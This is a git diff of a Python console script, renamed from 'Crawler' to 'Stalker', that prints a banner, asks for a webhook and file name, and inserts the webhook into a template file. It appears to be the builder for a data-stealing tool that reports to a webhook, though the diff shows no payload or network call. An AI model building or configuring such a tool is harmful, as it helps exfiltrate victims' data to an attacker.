@@ -4,28 +4,26 @@ import shutil
 from pystyle import *
 from time import sleep
 
-Crawler = '''
- ▄████▄   ██▀███   ▄▄▄       █     █░ ██▓    ▓█████  ██▀███  
-▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▓█░ █ ░█░▓██▒    ▓█   ▀ ▓██ ▒ ██▒
-▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒█░ █ ░█ ▒██░    ▒███   ▓██ ░▄█ ▒
-▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ░█░ █ ░█ ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
-▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒░░██▒██▓ ░██████▒░▒████▒░██▓ ▒██▒
-░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▓░▒ ▒  ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
-  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ▒ ░ ░  ░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
-░          ░░   ░   ░   ▒     ░   ░    ░ ░      ░     ░░   ░ 
-░ ░         ░           ░  ░    ░        ░  ░   ░  ░   ░     
-░                                                            
+Stalker = '''
+  ██████ ▄▄▄█████▓ ▄▄▄       ██▓     ██ ▄█▀▓█████  ██▀███  
+▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██▒     ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██░    ▓███▄░ ▒███   ▓██ ░▄█ ▒
+  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░    ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██████▒▒██▒ █▄░▒████▒░██▓ ▒██▒
+▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒░▓  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+░ ░▒  ░ ░    ░      ▒   ▒▒ ░░ ░ ▒  ░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+░  ░  ░    ░        ░   ▒     ░ ░   ░ ░░ ░    ░     ░░   ░ 
+      ░                 ░  ░    ░  ░░  ░      ░  ░   ░     
 '''
 
 System.Size(140, 40)
-System.Title("Crawler")
+System.Title("Stalker")
 System.Clear()
 Cursor.HideCursor()
 
 def Start():
-    System.Clear()
     print("\n"*2)
-    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(Crawler)))
+    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(Stalker)))
     print("\n"*5)
     current_directory = os.getcwd()
 
@@ -35,7 +33,7 @@ def Start():
     fname = Write.Input("\n\nEnter the file name : ", Colors.blue_to_cyan, interval=0.025)
     sleep(1.5)
 
-    with open("Crawler.py", "r") as file:
+    with open("Stalker.py", "r") as file:
         f = file.read()
 
     modified = f.replace("WebHook_URL", webhook)
